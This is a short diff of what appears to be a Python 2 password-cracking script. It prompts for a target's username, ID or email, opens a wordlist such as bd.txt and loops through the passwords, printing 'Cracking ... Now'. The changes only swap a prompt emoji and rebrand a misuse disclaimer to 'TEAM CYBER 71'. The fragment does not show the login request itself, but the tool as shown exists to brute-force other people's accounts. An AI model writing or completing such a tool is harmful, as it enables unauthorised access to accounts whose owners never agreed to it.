@@ -25,7 +25,7 @@ except ModuleNotFoundError:
 time.sleep(0.5)
 user = raw_input('[👹] Target Username/ID/Email >>?')
 time.sleep(0.8)
-wrdlstFileName = raw_input('\n[⚡] Wordlist Type bd.txt,Tufan.txt >> ')
+wrdlstFileName = raw_input('\n[👹] Wordlist Type bd.txt,Tufan.txt >> ')
 try:
     wordlist = open(wrdlstFileName, 'r')
 except FileNotFoundError:
@@ -36,7 +36,7 @@ time.sleep(0.8)
 print '\n\nCracking '+user+' Now...'
 
 time.sleep(1)
-print '\nIM NOT RESPONSIBLE FOR ANY MISS USE Asim\n'
+print '\nWE ARE NOT RESPONSIBLE FOR ANY MISS USE TEAM CYBER 71'
 for password in wordlist:
     if password == '' or password == ' ':
         pass
